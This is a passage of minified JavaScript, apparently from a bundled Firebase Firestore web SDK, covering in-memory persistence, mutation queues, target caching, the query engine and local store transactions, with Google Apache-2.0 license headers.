v=tw(n.get(g),r.get(g));v!==null&&p.set(g,v),s=s.add(g)}}),o.push(this.documentOverlayCache.saveOverlays(e,h,p))}return L.waitFor(o)}).next(()=>r)}recalculateAndSaveOverlaysForDocumentKeys(e,n){return this.remoteDocumentCache.getEntries(e,n).next(r=>this.recalculateAndSaveOverlays(e,r))}getDocumentsMatchingQuery(e,n,r,i){return function(o){return K.isDocumentKey(o.path)&&o.collectionGroup===null&&o.filters.length===0}(n)?this.getDocumentsMatchingDocumentQuery(e,n.path):W0(n)?this.getDocumentsMatchingCollectionGroupQuery(e,n,r,i):this.getDocumentsMatchingCollectionQuery(e,n,r,i)}getNextDocuments(e,n,r,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,n,r,i).next(s=>{const o=i-s.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,n,r.largestBatchId,i-s.size):L.resolve(Sr());let l=-1,u=s;return o.next(h=>L.forEach(h,(f,p)=>(l<p.largestBatchId&&(l=p.largestBatchId),s.get(f)?L.resolve():this.remoteDocumentCache.getEntry(e,f).next(g=>{u=u.insert(f,g)}))).next(()=>this.populateOverlays(e,h,s)).next(()=>this.computeViews(e,u,h,ne())).next(f=>({batchId:l,changes:K0(f)})))})}getDocumentsMatchingDocumentQuery(e,n){return this.getDocument(e,new K(n)).next(r=>{let i=Is();return r.isFoundDocument()&&(i=i.insert(r.key,r)),i})}getDocumentsMatchingCollectionGroupQuery(e,n,r,i){const s=n.collectionGroup;let o=Is();return this.indexManager.getCollectionParents(e,s).next(l=>L.forEach(l,u=>{const h=function(p,g){return new ko(g,null,p.explicitOrderBy.slice(),p.filters.slice(),p.limit,p.limitType,p.startAt,p.endAt)}(n,u.child(s));return this.getDocumentsMatchingCollectionQuery(e,h,r,i).next(f=>{f.forEach((p,g)=>{o=o.insert(p,g)})})}).next(()=>o))}getDocumentsMatchingCollectionQuery(e,n,r,i){let s;return this.documentOverlayCache.getOverlaysForCollection(e,n.path,r.largestBatchId).next(o=>(s=o,this.remoteDocumentCache.getDocumentsMatchingQuery(e,n,r,s,i))).next(o=>{s.forEach((u,h)=>{const f=h.getKey();o.get(f)===null&&(o=o.insert(f,Ze.newInvalidDocument(f)))});let l=Is();return o.forEach((u,h)=>{const f=s.get(u);f!==void 0&&js(f.mutation,h,Et.empty(),pe.now()),Jl(n,h)&&(l=l.insert(u,h))}),l})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Pk{constructor(e){this.serializer=e,this.hr=new Map,this.Pr=new Map}getBundleMetadata(e,n){return L.resolve(this.hr.get(n))}saveBundleMetadata(e,n){return this.hr.set(n.id,function(i){return{id:i.id,version:i.version,createTime:en(i.createTime)}}(n)),L.resolve()}getNamedQuery(e,n){return L.resolve(this.Pr.get(n))}saveNamedQuery(e,n){return this.Pr.set(n.name,function(i){return{name:i.name,query:Sk(i.bundledQuery),readTime:en(i.readTime)}}(n)),L.resolve()}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nk{constructor(){this.overlays=new Ie(K.comparator),this.Ir=new Map}getOverlay(e,n){return L.resolve(this.overlays.get(n))}getOverlays(e,n){const r=Sr();return L.forEach(n,i=>this.getOverlay(e,i).next(s=>{s!==null&&r.set(i,s)})).next(()=>r)}saveOverlays(e,n,r){return r.forEach((i,s)=>{this.ht(e,n,s)}),L.resolve()}removeOverlaysForBatchId(e,n,r){const i=this.Ir.get(r);return i!==void 0&&(i.forEach(s=>this.overlays=this.overlays.remove(s)),this.Ir.delete(r)),L.resolve()}getOverlaysForCollection(e,n,r){const i=Sr(),s=n.length+1,o=new K(n.child("")),l=this.overlays.getIteratorFrom(o);for(;l.hasNext();){const u=l.getNext().value,h=u.getKey();if(!n.isPrefixOf(h.path))break;h.path.length===s&&u.largestBatchId>r&&i.set(u.getKey(),u)}return L.resolve(i)}getOverlaysForCollectionGroup(e,n,r,i){let s=new Ie((h,f)=>h-f);const o=this.overlays.getIterator();for(;o.hasNext();){const h=o.getNext().value;if(h.getKey().getCollectionGroup()===n&&h.largestBatchId>r){let f=s.get(h.largestBatchId);f===null&&(f=Sr(),s=s.insert(h.largestBatchId,f)),f.set(h.getKey(),h)}}const l=Sr(),u=s.getIterator();for(;u.hasNext()&&(u.getNext().value.forEach((h,f)=>l.set(h,f)),!(l.size()>=i)););return L.resolve(l)}ht(e,n,r){const i=this.overlays.get(r.key);if(i!==null){const o=this.Ir.get(i.largestBatchId).delete(r.key);this.Ir.set(i.largestBatchId,o)}this.overlays=this.overlays.insert(r.key,new ek(n,r));let s=this.Ir.get(n);s===void 0&&(s=ne(),this.Ir.set(n,s)),this.Ir.set(n,s.add(r.key))}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dk{constructor(){this.sessionToken=We.EMPTY_BYTE_STRING}getSessionToken(e){return L.resolve(this.sessionToken)}setSessionToken(e,n){return this.sessionToken=n,L.resolve()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class hf{constructor(){this.Tr=new Be(Ve.Er),this.dr=new Be(Ve.Ar)}isEmpty(){return this.Tr.isEmpty()}addReference(e,n){const r=new Ve(e,n);this.Tr=this.Tr.add(r),this.dr=this.dr.add(r)}Rr(e,n){e.forEach(r=>this.addReference(r,n))}removeReference(e,n){this.Vr(new Ve(e,n))}mr(e,n){e.forEach(r=>this.removeReference(r,n))}gr(e){const n=new K(new ye([])),r=new Ve(n,e),i=new Ve(n,e+1),s=[];return this.dr.forEachInRange([r,i],o=>{this.Vr(o),s.push(o.key)}),s}pr(){this.Tr.forEach(e=>this.Vr(e))}Vr(e){this.Tr=this.Tr.delete(e),this.dr=this.dr.delete(e)}yr(e){const n=new K(new ye([])),r=new Ve(n,e),i=new Ve(n,e+1);let s=ne();return this.dr.forEachInRange([r,i],o=>{s=s.add(o.key)}),s}containsKey(e){const n=new Ve(e,0),r=this.Tr.firstAfterOrEqual(n);return r!==null&&e.isEqual(r.key)}}class Ve{constructor(e,n){this.key=e,this.wr=n}static Er(e,n){return K.comparator(e.key,n.key)||le(e.wr,n.wr)}static Ar(e,n){return le(e.wr,n.wr)||K.comparator(e.key,n.key)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bk{constructor(e,n){this.indexManager=e,this.referenceDelegate=n,this.mutationQueue=[],this.Sr=1,this.br=new Be(Ve.Er)}checkEmpty(e){return L.resolve(this.mutationQueue.length===0)}addMutationBatch(e,n,r,i){const s=this.Sr;this.Sr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const o=new Zx(s,n,r,i);this.mutationQueue.push(o);for(const l of i)this.br=this.br.add(new Ve(l.key,s)),this.indexManager.addToCollectionParentIndex(e,l.key.path.popLast());return L.resolve(o)}lookupMutationBatch(e,n){return L.resolve(this.Dr(n))}getNextMutationBatchAfterBatchId(e,n){const r=n+1,i=this.vr(r),s=i<0?0:i;return L.resolve(this.mutationQueue.length>s?this.mutationQueue[s]:null)}getHighestUnacknowledgedBatchId(){return L.resolve(this.mutationQueue.length===0?-1:this.Sr-1)}getAllMutationBatches(e){return L.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,n){const r=new Ve(n,0),i=new Ve(n,Number.POSITIVE_INFINITY),s=[];return this.br.forEachInRange([r,i],o=>{const l=this.Dr(o.wr);s.push(l)}),L.resolve(s)}getAllMutationBatchesAffectingDocumentKeys(e,n){let r=new Be(le);return n.forEach(i=>{const s=new Ve(i,0),o=new Ve(i,Number.POSITIVE_INFINITY);this.br.forEachInRange([s,o],l=>{r=r.add(l.wr)})}),L.resolve(this.Cr(r))}getAllMutationBatchesAffectingQuery(e,n){const r=n.path,i=r.length+1;let s=r;K.isDocumentKey(s)||(s=s.child(""));const o=new Ve(new K(s),0);let l=new Be(le);return this.br.forEachWhile(u=>{const h=u.key.path;return!!r.isPrefixOf(h)&&(h.length===i&&(l=l.add(u.wr)),!0)},o),L.resolve(this.Cr(l))}Cr(e){const n=[];return e.forEach(r=>{const i=this.Dr(r);i!==null&&n.push(i)}),n}removeMutationBatch(e,n){ce(this.Fr(n.batchId,"removed")===0),this.mutationQueue.shift();let r=this.br;return L.forEach(n.mutations,i=>{const s=new Ve(i.key,n.batchId);return r=r.delete(s),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)}).next(()=>{this.br=r})}On(e){}containsKey(e,n){const r=new Ve(n,0),i=this.br.firstAfterOrEqual(r);return L.resolve(n.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,L.resolve()}Fr(e,n){return this.vr(e)}vr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Dr(e){const n=this.vr(e);return n<0||n>=this.mutationQueue.length?null:this.mutationQueue[n]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vk{constructor(e){this.Mr=e,this.docs=function(){return new Ie(K.comparator)}(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,n){const r=n.key,i=this.docs.get(r),s=i?i.size:0,o=this.Mr(n);return this.docs=this.docs.insert(r,{document:n.mutableCopy(),size:o}),this.size+=o-s,this.indexManager.addToCollectionParentIndex(e,r.path.popLast())}removeEntry(e){const n=this.docs.get(e);n&&(this.docs=this.docs.remove(e),this.size-=n.size)}getEntry(e,n){const r=this.docs.get(n);return L.resolve(r?r.document.mutableCopy():Ze.newInvalidDocument(n))}getEntries(e,n){let r=Cn();return n.forEach(i=>{const s=this.docs.get(i);r=r.insert(i,s?s.document.mutableCopy():Ze.newInvalidDocument(i))}),L.resolve(r)}getDocumentsMatchingQuery(e,n,r,i){let s=Cn();const o=n.path,l=new K(o.child("")),u=this.docs.getIteratorFrom(l);for(;u.hasNext();){const{key:h,value:{document:f}}=u.getNext();if(!o.isPrefixOf(h.path))break;h.path.length>o.length+1||yx(gx(f),r)<=0||(i.has(f.key)||Jl(n,f))&&(s=s.insert(f.key,f.mutableCopy()))}return L.resolve(s)}getAllFromCollectionGroup(e,n,r,i){X()}Or(e,n){return L.forEach(this.docs,r=>n(r))}newChangeBuffer(e){return new Ok(this)}getSize(e){return L.resolve(this.size)}}class Ok extends Rk{constructor(e){super(),this.cr=e}applyChanges(e){const n=[];return this.changes.forEach((r,i)=>{i.isValidDocument()?n.push(this.cr.addEntry(e,i)):this.cr.removeEntry(r)}),L.waitFor(n)}getFromCache(e,n){return this.cr.getEntry(e,n)}getAllFromCache(e,n){return this.cr.getEntries(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Lk{constructor(e){this.persistence=e,this.Nr=new Hi(n=>nf(n),rf),this.lastRemoteSnapshotVersion=Z.min(),this.highestTargetId=0,this.Lr=0,this.Br=new hf,this.targetCount=0,this.kr=Li.Bn()}forEachTarget(e,n){return this.Nr.forEach((r,i)=>n(i)),L.resolve()}getLastRemoteSnapshotVersion(e){return L.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return L.resolve(this.Lr)}allocateTargetId(e){return this.highestTargetId=this.kr.next(),L.resolve(this.highestTargetId)}setTargetsMetadata(e,n,r){return r&&(this.lastRemoteSnapshotVersion=r),n>this.Lr&&(this.Lr=n),L.resolve()}Kn(e){this.Nr.set(e.target,e);const n=e.targetId;n>this.highestTargetId&&(this.kr=new Li(n),this.highestTargetId=n),e.sequenceNumber>this.Lr&&(this.Lr=e.sequenceNumber)}addTargetData(e,n){return this.Kn(n),this.targetCount+=1,L.resolve()}updateTargetData(e,n){return this.Kn(n),L.resolve()}removeTargetData(e,n){return this.Nr.delete(n.target),this.Br.gr(n.targetId),this.targetCount-=1,L.resolve()}removeTargets(e,n,r){let i=0;const s=[];return this.Nr.forEach((o,l)=>{l.sequenceNumber<=n&&r.get(l.targetId)===null&&(this.Nr.delete(o),s.push(this.removeMatchingKeysForTargetId(e,l.targetId)),i++)}),L.waitFor(s).next(()=>i)}getTargetCount(e){return L.resolve(this.targetCount)}getTargetData(e,n){const r=this.Nr.get(n)||null;return L.resolve(r)}addMatchingKeys(e,n,r){return this.Br.Rr(n,r),L.resolve()}removeMatchingKeys(e,n,r){this.Br.mr(n,r);const i=this.persistence.referenceDelegate,s=[];return i&&n.forEach(o=>{s.push(i.markPotentiallyOrphaned(e,o))}),L.waitFor(s)}removeMatchingKeysForTargetId(e,n){return this.Br.gr(n),L.resolve()}getMatchingKeysForTargetId(e,n){const r=this.Br.yr(n);return L.resolve(r)}containsKey(e,n){return L.resolve(this.Br.containsKey(n))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Mk{constructor(e,n){this.qr={},this.overlays={},this.Qr=new Jd(0),this.Kr=!1,this.Kr=!0,this.$r=new Dk,this.referenceDelegate=e(this),this.Ur=new Lk(this),this.indexManager=new Ak,this.remoteDocumentCache=function(i){return new Vk(i)}(r=>this.referenceDelegate.Wr(r)),this.serializer=new Ik(n),this.Gr=new Pk(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.Kr=!1,Promise.resolve()}get started(){return this.Kr}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let n=this.overlays[e.toKey()];return n||(n=new Nk,this.overlays[e.toKey()]=n),n}getMutationQueue(e,n){let r=this.qr[e.toKey()];return r||(r=new bk(n,this.referenceDelegate),this.qr[e.toKey()]=r),r}getGlobalsCache(){return this.$r}getTargetCache(){return this.Ur}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Gr}runTransaction(e,n,r){G("MemoryPersistence","Starting transaction:",e);const i=new Fk(this.Qr.next());return this.referenceDelegate.zr(),r(i).next(s=>this.referenceDelegate.jr(i).next(()=>s)).toPromise().then(s=>(i.raiseOnCommittedEvent(),s))}Hr(e,n){return L.or(Object.values(this.qr).map(r=>()=>r.containsKey(e,n)))}}class Fk extends _x{constructor(e){super(),this.currentSequenceNumber=e}}class df{constructor(e){this.persistence=e,this.Jr=new hf,this.Yr=null}static Zr(e){return new df(e)}get Xr(){if(this.Yr)return this.Yr;throw X()}addReference(e,n,r){return this.Jr.addReference(r,n),this.Xr.delete(r.toString()),L.resolve()}removeReference(e,n,r){return this.Jr.removeReference(r,n),this.Xr.add(r.toString()),L.resolve()}markPotentiallyOrphaned(e,n){return this.Xr.add(n.toString()),L.resolve()}removeTarget(e,n){this.Jr.gr(n.targetId).forEach(i=>this.Xr.add(i.toString()));const r=this.persistence.getTargetCache();return r.getMatchingKeysForTargetId(e,n.targetId).next(i=>{i.forEach(s=>this.Xr.add(s.toString()))}).next(()=>r.removeTargetData(e,n))}zr(){this.Yr=new Set}jr(e){const n=this.persistence.getRemoteDocumentCache().newChangeBuffer();return L.forEach(this.Xr,r=>{const i=K.fromPath(r);return this.ei(e,i).next(s=>{s||n.removeEntry(i,Z.min())})}).next(()=>(this.Yr=null,n.apply(e)))}updateLimboDocument(e,n){return this.ei(e,n).next(r=>{r?this.Xr.delete(n.toString()):this.Xr.add(n.toString())})}Wr(e){return 0}ei(e,n){return L.or([()=>L.resolve(this.Jr.containsKey(n)),()=>this.persistence.getTargetCache().containsKey(e,n),()=>this.persistence.Hr(e,n)])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ff{constructor(e,n,r,i){this.targetId=e,this.fromCache=n,this.$i=r,this.Ui=i}static Wi(e,n){let r=ne(),i=ne();for(const s of n.docChanges)switch(s.type){case 0:r=r.add(s.doc.key);break;case 1:i=i.add(s.doc.key)}return new ff(e,n.fromCache,r,i)}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Uk{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jk{constructor(){this.Gi=!1,this.zi=!1,this.ji=100,this.Hi=function(){return WA()?8:wx(tt())>0?6:4}()}initialize(e,n){this.Ji=e,this.indexManager=n,this.Gi=!0}getDocumentsMatchingQuery(e,n,r,i){const s={result:null};return this.Yi(e,n).next(o=>{s.result=o}).next(()=>{if(!s.result)return this.Zi(e,n,i,r).next(o=>{s.result=o})}).next(()=>{if(s.result)return;const o=new Uk;return this.Xi(e,n,o).next(l=>{if(s.result=l,this.zi)return this.es(e,n,o,l.size)})}).next(()=>s.result)}es(e,n,r,i){return r.documentReadCount<this.ji?(gs()<=re.DEBUG&&G("QueryEngine","SDK will not create cache indexes for query:",Xr(n),"since it only creates cache indexes for collection contains","more than or equal to",this.ji,"documents"),L.resolve()):(gs()<=re.DEBUG&&G("QueryEngine","Query:",Xr(n),"scans",r.documentReadCount,"local documents and returns",i,"documents as results."),r.documentReadCount>this.Hi*i?(gs()<=re.DEBUG&&G("QueryEngine","The SDK decides to create cache indexes for query:",Xr(n),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,Zt(n))):L.resolve())}Yi(e,n){if(Vg(n))return L.resolve(null);let r=Zt(n);return this.indexManager.getIndexType(e,r).next(i=>i===0?null:(n.limit!==null&&i===1&&(n=Ph(n,null,"F"),r=Zt(n)),this.indexManager.getDocumentsMatchingTarget(e,r).next(s=>{const o=ne(...s);return this.Ji.getDocuments(e,o).next(l=>this.indexManager.getMinOffset(e,r).next(u=>{const h=this.ts(n,l);return this.ns(n,h,o,u.readTime)?this.Yi(e,Ph(n,null,"F")):this.rs(e,h,n,u)}))})))}Zi(e,n,r,i){return Vg(n)||i.isEqual(Z.min())?L.resolve(null):this.Ji.getDocuments(e,r).next(s=>{const o=this.ts(n,s);return this.ns(n,o,r,i)?L.resolve(null):(gs()<=re.DEBUG&&G("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),Xr(n)),this.rs(e,o,n,mx(i,-1)).next(l=>l))})}ts(e,n){let r=new Be(H0(e));return n.forEach((i,s)=>{Jl(e,s)&&(r=r.add(s))}),r}ns(e,n,r,i){if(e.limit===null)return!1;if(r.size!==n.size)return!0;const s=e.limitType==="F"?n.last():n.first();return!!s&&(s.hasPendingWrites||s.version.compareTo(i)>0)}Xi(e,n,r){return gs()<=re.DEBUG&&G("QueryEngine","Using full collection scan to execute query:",Xr(n)),this.Ji.getDocumentsMatchingQuery(e,n,ar.min(),r)}rs(e,n,r,i){return this.Ji.getDocumentsMatchingQuery(e,r,i).next(s=>(n.forEach(o=>{s=s.insert(o.key,o)}),s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zk{constructor(e,n,r,i){this.persistence=e,this.ss=n,this.serializer=i,this.os=new Ie(le),this._s=new Hi(s=>nf(s),rf),this.us=new Map,this.cs=e.getRemoteDocumentCache(),this.Ur=e.getTargetCache(),this.Gr=e.getBundleCache(),this.ls(r)}ls(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new kk(this.cs,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.cs.setIndexManager(this.indexManager),this.ss.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",n=>e.collect(n,this.os))}}function Bk(t,e,n,r){return new zk(t,e,n,r)}async function fw(t,e){const n=ee(t);return await n.persistence.runTransaction("Handle user change","readonly",r=>{let i;return n.mutationQueue.getAllMutationBatches(r).next(s=>(i=s,n.ls(e),n.mutationQueue.getAllMutationBatches(r))).next(s=>{const o=[],l=[];let u=ne();for(const h of i){o.push(h.batchId);for(const f of h.mutations)u=u.add(f.key)}for(const h of s){l.push(h.batchId);for(const f of h.mutations)u=u.add(f.key)}return n.localDocuments.getDocuments(r,u).next(h=>({hs:h,removedBatchIds:o,addedBatchIds:l}))})})}function $k(t,e){const n=ee(t);return n.persistence.runTransaction("Acknowledge batch","readwrite-primary",r=>{const i=e.batch.keys(),s=n.cs.newChangeBuffer({trackRemovals:!0});return function(l,u,h,f){const p=h.batch,g=p.keys();let v=L.resolve();return g.forEach(A=>{v=v.next(()=>f.getEntry(u,A)).next(k=>{const N=h.docVersions.get(A);ce(N!==null),k.version.compareTo(N)<0&&(p.applyToRemoteDocument(k,h),k.isValidDocument()&&(k.setReadTime(h.commitVersion),f.addEntry(k)))})}),v.next(()=>l.mutationQueue.removeMutationBatch(u,p))}(n,r,e,s).next(()=>s.apply(r)).next(()=>n.mutationQueue.performConsistencyCheck(r)).next(()=>n.documentOverlayCache.removeOverlaysForBatchId(r,i,e.batch.batchId)).next(()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(r,function(l){let u=ne();for(let h=0;h<l.mutationResults.length;++h)l.mutationResults[h].transformResults.length>0&&(u=u.add(l.batch.mutations[h].key));return u}(e))).next(()=>n.localDocuments.getDocuments(r,i))})}function pw(t){const e=ee(t);return e.persistence.runTransaction("Get last remote snapshot version","readonly",n=>e.Ur.getLastRemoteSnapshotVersion(n))}function Wk(t,e){const n=ee(t),r=e.snapshotVersion;let i=n.os;return n.persistence.runTransaction("Apply remote event","readwrite-primary",s=>{const o=n.cs.newChangeBuffer({trackRemovals:!0});i=n.os;const l=[];e.targetChanges.forEach((f,p)=>{const g=i.get(p);if(!g)return;l.push(n.Ur.removeMatchingKeys(s,f.removedDocuments,p).next(()=>n.Ur.addMatchingKeys(s,f.addedDocuments,p)));let v=g.withSequenceNumber(s.currentSequenceNumber);e.targetMismatches.get(p)!==null?v=v.withResumeToken(We.EMPTY_BYTE_STRING,Z.min()).withLastLimboFreeSnapshotVersion(Z.min()):f.resumeToken.approximateByteSize()>0&&(v=v.withResumeToken(f.resumeToken,r)),i=i.insert(p,v),function(k,N,S){return k.resumeToken.approximateByteSize()===0||N.snapshotVersion.toMicroseconds()-k.snapshotVersion.toMicroseconds()>=3e8?!0:S.addedDocuments.size+S.modifiedDocuments.size+S.removedDocuments.size>0}(g,v,f)&&l.push(n.Ur.updateTargetData(s,v))});let u=Cn(),h=ne();if(e.documentUpdates.forEach(f=>{e.resolvedLimboDocuments.has(f)&&l.push(n.persistence.referenceDelegate.updateLimboDocument(s,f))}),l.push(qk(s,o,e.documentUpdates).next(f=>{u=f.Ps,h=f.Is})),!r.isEqual(Z.min())){const f=n.Ur.getLastRemoteSnapshotVersion(s).next(p=>n.Ur.setTargetsMetadata(s,s.currentSequenceNumber,r));l.push(f)}return L.waitFor(l).next(()=>o.apply(s)).next(()=>n.localDocuments.getLocalViewOfDocuments(s,u,h)).next(()=>u)}).then(s=>(n.os=i,s))}function qk(t,e,n){let r=ne(),i=ne();return n.forEach(s=>r=r.add(s)),e.getEntries(t,r).next(s=>{let o=Cn();return n.forEach((l,u)=>{const h=s.get(l);u.isFoundDocument()!==h.isFoundDocument()&&(i=i.add(l)),u.isNoDocument()&&u.version.isEqual(Z.min())?(e.removeEntry(l,u.readTime),o=o.insert(l,u)):!h.isValidDocument()||u.version.compareTo(h.version)>0||u.version.compareTo(h.version)===0&&h.hasPendingWrites?(e.addEntry(u),o=o.insert(l,u)):G("LocalStore","Ignoring outdated watch update for ",l,". Current version:",h.version," Watch version:",u.version)}),{Ps:o,Is:i}})}function Hk(t,e){const n=ee(t);return n.persistence.runTransaction("Get next mutation batch","readonly",r=>(e===void 0&&(e=-1),n.mutationQueue.getNextMutationBatchAfterBatchId(r,e)))}function Gk(t,e){const n=ee(t);return n.persistence.runTransaction("Allocate target","readwrite",r=>{let i;return n.Ur.getTargetData(r,e).next(s=>s?(i=s,L.resolve(i)):n.Ur.allocateTargetId(r).next(o=>(i=new Hn(e,o,"TargetPurposeListen",r.currentSequenceNumber),n.Ur.addTargetData(r,i).next(()=>i))))}).then(r=>{const i=n.os.get(r.targetId);return(i===null||r.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(n.os=n.os.insert(r.targetId,r),n._s.set(e,r.targetId)),r})}async function Oh(t,e,n){const r=ee(t),i=r.os.get(e),s=n?"readwrite":"readwrite-primary";try{n||await r.persistence.runTransaction("Release target",s,o=>r.persistence.referenceDelegate.removeTarget(o,i))}catch(o){if(!xo(o))throw o;G("LocalStore",`Failed to update sequence numbers for target ${e}: ${o}`)}r.os=r.os.remove(e),r._s.delete(i.target)}function qg(t,e,n){const r=ee(t);let i=Z.min(),s=ne();return r.persistence.runTransaction("Execute query","readwrite",o=>function(u,h,f){const p=ee(u),g=p._s.get(f);return g!==void 0?L.resolve(p.os.get(g)):p.Ur.getTargetData(h,f)}(r,o,Zt(e)).next(l=>{if(l)return i=l.lastLimboFreeSnapshotVersion,r.Ur.getMatchingKeysForTargetId(o,l.targetId).next(u=>{s=u})}).next(()=>r.ss.getDocumentsMatchingQuery(o,e,n?i:Z.min(),n?s:ne())).next(l=>(Kk(r,Fx(e),l),{documents:l,Ts:s})))}function Kk(t,e,n){let r=t.us.get(e)||Z.min();n.forEach((i,s)=>{s.readTime.compareTo(r)>0&&(r=s.readTime)}),t.us.set(e,r)}class 